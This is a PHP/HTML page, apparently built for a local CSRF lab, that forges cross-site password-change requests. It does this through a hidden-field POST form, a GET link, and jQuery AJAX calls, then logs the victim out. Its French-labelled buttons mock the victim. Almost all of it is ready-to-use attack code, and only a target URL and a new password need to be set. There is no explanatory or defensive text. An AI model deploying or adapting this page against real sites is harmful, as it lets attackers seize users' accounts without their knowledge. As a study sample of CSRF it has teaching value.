<?php 
	$target_site = 'http://localhost/CSRF-Attack'; //Replace with targeted site
	$new_password = 'toto'; //Replace with desired password
?>

<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript" src="jquery"></script>
    </head>
    <script>
        function changePwdPost(){
            $.ajax({
                url : '<?php echo $target_site?>/change/password',
                type : 'POST', 
                data : { 
                    password : 'toto'
                }
            })
            .done(function(res) {
                $.ajax({
                    url : '<?php echo $target_site?>/CSRF-Attack/logout'
                })
            });        
        }
        function changePwdGet(){
            $.ajax({
                url : '<?php echo $target_site?>/change/password/level2?pwd=<?php echo $new_password?>'
            })
            .done(function(res) {
                $.ajax({
                    url : '<?php echo $target_site?>/CSRF-Attack/logout'
                })
            });        
        }

        $(document).ready(function(){ 
            $('#hack-post').on("click", function(){
                changePwdPost();
            });

            $('#hack-get').on("click", function(){
                changePwdGet();
            });
        });
            
    </script>
    <body>
        <h1>Sans ajax</h1>
        <form action="<?php echo $target_site?>/change/password" method="POST">
            <input type="hidden" name="password" value="<?php echo $new_password?>"/>
            <input type="submit" value="Montre moi ce que tu veux"/>
        </form>
        <br>
        <a href="<?php echo $target_site?>/change/password/level2?pwd=<?php echo $new_password?>">Tu veux perdre ton compte ?</a>
        <hr>
        <h1>Ajax</h1>
        <button id="hack-post">Hack toi en postant</button>
        <br>
        <button id="hack-get">Hack toi en gettant</button>
    </body>
</html>